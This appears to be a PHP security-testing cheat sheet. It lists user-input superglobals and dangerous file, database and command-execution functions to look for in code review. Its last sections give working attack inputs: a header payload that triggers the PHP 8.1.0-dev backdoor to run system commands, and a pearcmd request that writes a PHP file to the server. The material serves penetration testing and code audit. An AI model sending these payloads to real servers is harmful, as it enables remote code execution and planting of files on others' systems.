### User supplied data
```
$_GET
$HTTP_GET_VARS
$_POST
$HTTP_POST_VARS
$_COOKIE
$HTTP_COOKIE_VARS
$_REQUEST
$_FILES
$HTTP_POST_FILES
$_SERVER['REQUEST_METHOD']
$_SERVER['QUERY_STRING']
$_SERVER['REQUEST_URI']
$_SERVER['HTTP_ACCEPT']
$_SERVER['HTTP_ACCEPT_CHARSET']
$_SERVER['HTTP_ACCEPT_ENCODING']
$_SERVER['HTTP_ACCEPT_LANGUAGE']
$_SERVER['HTTP_CONNECTION']
$_SERVER['HTTP_HOST']
$_SERVER['HTTP_REFERER']
$_SERVER['HTTP_USER_AGENT']
```

### File access
```
copy
file
file_get_contents
file_put_contents
fopen
fpassthru
gzfile
gzopen
gzpassthru
include
include_once
mkdir
parse_ini_file
readfile
readgzfile
rename
require
require_once
rmdir
unlink
virtual
```

### Database access
```
mysql_query
mssql_query
pg_query
```

### OS code execution
```
passthru
popen
proc_open
shell_exec
system
```

### PHP 8.1.0-dev - possible RCE
```
User-Agentt: zerodiumsleep(5);
User-Agentt: zerodiumsystem('id');
```

### Argument injection and write file 
```
# if register_argc_argv is enabled
# check argument injection ($_SERVER['argv'] should contain inject)
GET /phpinfo.php?inject

# create file using pearcmd (PEAR is used to manage PEAR packages)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/<path>/<to>/<file>.php
```

